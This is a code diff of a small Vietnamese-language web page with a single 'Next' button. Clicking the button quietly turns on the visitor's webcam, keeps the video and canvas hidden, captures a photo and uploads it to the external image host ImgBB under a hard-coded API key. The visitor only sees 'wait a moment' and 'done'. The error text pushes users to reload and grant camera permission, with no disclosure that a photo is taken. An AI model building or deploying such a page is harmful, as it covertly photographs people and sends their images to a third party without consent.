@@ -1,108 +1,138 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Next</title>
   <style>
     body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       background: #000;
       color: white;
+      display: flex;
       flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
       font-family: Arial, sans-serif;
       text-align: center;
     }
-
     button {
-      font-size: 2rem;
-      padding: 18px 48px;
+      background: linear-gradient(90deg, #007bff, #00bfff);
       border: none;
-      border-radius: 16px;
-      cursor: pointer;
-      background: linear-gradient(90deg, #007bff, #00d4ff);
+      padding: 14px 36px;
+      border-radius: 10px;
       color: white;
+      font-size: 20px;
+      cursor: pointer;
       transition: 0.3s;
     }
-
     button:hover {
-      transform: scale(1.05);
+      opacity: 0.85;
     }
-
-    #status {
-      margin-top: 25px;
-      font-size: 1.3rem;
-      text-align: center;
+    .loading {
+      display: none;
+      font-size: 18px;
+      margin-top: 12px;
     }
-
-    .spinner {
-      width: 24px;
-      height: 24px;
+    .spin {
       border: 3px solid rgba(255, 255, 255, 0.3);
-      border-top: 3px solid white;
+      border-top: 3px solid #fff;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      width: 22px;
+      height: 22px;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    video, canvas { display: none; }
+    video, canvas {
+      display: none;
+    }
+    .error {
+      color: #ff6b6b;
+      font-size: 18px;
+      line-height: 1.6;
+    }
+    .refresh-btn {
+      background: linear-gradient(90deg, #006eff, #00c8ff);
+      padding: 12px 26px;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-size: 18px;
+      margin-top: 16px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <button id="nextBtn">Next</button>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
-  <div id="status"></div>
+  <button id="nextBtn">Next</button>
+  <div class="loading" id="loading"><span class="spin"></span>Chờ xíu...</div>
+  <div id="errorMsg" class="error"></div>
 
   <script>
-    const API_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0"; // Imgbb API key
-    const API_URL = "https://api.imgbb.com/1/upload";
-
     const nextBtn = document.getElementById("nextBtn");
+    const loading = document.getElementById("loading");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const statusDiv = document.getElementById("status");
+    const errorMsg = document.getElementById("errorMsg");
+
+    const IMG_BB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
 
     nextBtn.addEventListener("click", async () => {
       nextBtn.style.display = "none";
-      statusDiv.innerHTML = `<div class="spinner"></div> <span>⏳ Chờ xíu...</span>`;
+      loading.style.display = "block";
+      errorMsg.textContent = "";
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
+        // ⏳ Chờ 0.3 giây cho camera ổn định
         setTimeout(async () => {
-          const context = canvas.getContext("2d");
+          const ctx = canvas.getContext("2d");
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          const base64Image = canvas.toDataURL("image/png").split(",")[1];
+          // Dừng camera
+          stream.getTracks().forEach(track => track.stop());
+
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
           const formData = new FormData();
-          formData.append("image", base64Image);
+          formData.append("image", blob);
+          formData.append("key", IMG_BB_KEY);
 
-          await fetch(`${API_URL}?key=${API_KEY}`, {
+          // 📨 Gửi ảnh lên ImgBB
+          const res = await fetch("https://api.imgbb.com/1/upload", {
             method: "POST",
-            body: formData
+            body: formData,
           });
 
-          stream.getTracks().forEach(track => track.stop());
-          statusDiv.innerHTML = "✅ Đã xong!";
-        }, 1000);
+          const result = await res.json();
+
+          if (result.success) {
+            loading.innerHTML = "✅ Đã xong!";
+          } else {
+            throw new Error("Không gửi được ảnh.");
+          }
+
+        }, 300);
+
       } catch (err) {
-        statusDiv.innerHTML = `
-          <div>🔁 <b>Làm mới trang và bấm Đồng ý</b></div><br>
-          <button id="reloadBtn">Làm mới trang</button>
+        loading.style.display = "none";
+        errorMsg.innerHTML = `
+          ❌ Không thể bật camera.<br>
+          🔄 Vui lòng <b>làm mới trang</b> và bấm <b>Đồng ý</b> để cấp quyền camera.
+          <br><button class="refresh-btn" onclick="location.reload()">Làm mới trang</button>
         `;
-        const reloadBtn = document.getElementById("reloadBtn");
-        reloadBtn.addEventListener("click", () => location.reload());
       }
     });
   </script>
